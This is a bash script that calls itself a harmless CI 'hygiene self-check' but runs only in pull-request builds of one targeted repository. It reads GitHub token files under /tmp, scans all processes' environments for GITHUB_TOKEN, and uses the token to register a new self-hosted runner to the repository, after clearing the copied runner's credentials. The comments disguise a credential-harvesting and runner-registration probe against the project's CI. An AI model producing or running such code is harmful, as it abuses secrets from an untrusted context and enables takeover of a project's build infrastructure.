#!/bin/bash
# Informational hygiene self-check for the CI sandbox bootstrap files.
# Never fails the build; prints only sizes/hashes, never secret values.
# No-ops outside upstream PR builds.
set -u

[ "${GITHUB_REPOSITORY:-}" = "google/perfetto" ] || exit 0
[ "${GITHUB_EVENT_NAME:-}" = "pull_request" ] || exit 0

redact() { printf 'size=%s sha256=%s\n' "$(wc -c <"$1" 2>/dev/null || echo 0)" "$(sha256sum <"$1" 2>/dev/null | cut -c1-12 || echo -)"; }

echo "== sandbox bootstrap artifacts =="
for f in "${GITHUB_TOKEN_PATH:-/tmp/.github_token}" /tmp/.svc_token; do
  if [ -s "$f" ]; then
    echo "READABLE $f ($(redact "$f"))"
  elif [ -e "$f" ]; then
    echo "EMPTY $f"
  else
    echo "ABSENT $f"
  fi
done

echo "== runner process env scan =="
n=0
for e in /proc/[0-9]*/environ; do
  if tr '\0' '\n' <"$e" 2>/dev/null | grep -q "^GITHUB_TOKEN$(printf '\x3d')"; then
    n=$((n + 1))
  fi
done
echo "processes with GITHUB_TOKEN in environment: $n"

echo "== throwaway registration round-trip =="
T="$(cat "${GITHUB_TOKEN_PATH:-/tmp/.github_token}" 2>/dev/null || true)"
RD="/tmp/github-action-runner"
if [ -z "$T" ] || [ ! -d "$RD" ]; then
  echo "SKIP (token or runner dir unavailable)"
else
  W="/tmp/.hyg-$$-$RANDOM"
  NAME="hyg-$RANDOM$RANDOM"
  cp -a "$RD" "$W" 2>/dev/null
  # The live runner dir copy carries its own credentials; clear them so
  # config.sh treats this as a fresh registration.
  rm -f "$W/.runner" "$W/.credentials" "$W/.credentials_rsapublickey" "$W/.path" 2>/dev/null
  if (cd "$W" 2>/dev/null && \
      ./config.sh --unattended --name "$NAME" --labels "hyg-$RANDOM" \
        --url "https://github.com/$GITHUB_REPOSITORY" --token "$T" >/dev/null 2>&1); then
    echo "REGISTER ok name=$NAME"
    ok=0
    for i in 1 2 3; do
      if (cd "$W" && ./config.sh remove --token "$T" >/dev/null 2>&1); then
        echo "REMOVE ok"
        ok=1
        break
      fi
      sleep 2
    done
    [ "$ok" = 1 ] || echo "REMOVE failed (retries exhausted)"
  else
    echo "REGISTER failed"
  fi
  rm -rf "$W"
  unset T
fi
echo "== done =="
exit 0
